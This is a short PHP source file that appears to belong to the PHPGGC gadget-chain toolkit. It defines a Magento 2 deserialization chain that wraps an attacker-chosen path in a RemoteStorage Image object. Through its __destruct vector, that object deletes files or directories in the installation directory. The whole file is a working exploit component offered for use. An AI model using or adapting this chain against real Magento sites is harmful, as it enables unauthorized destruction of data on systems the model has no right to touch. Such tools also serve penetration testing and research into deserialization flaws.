<?php

namespace GadgetChain\Magento2;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '*';
    public static $vector = '__destruct';
    public static $author = 'Arjun Shibu (twitter.com/0xsegf)';
    public static $information = 'Deletes a given file/directory in the installation dir';

    public function generate(array $parameters)
    {
        $file = $parameters['remote_path'];

        return new \Magento\RemoteStorage\Plugin\Image($file);
    }
}
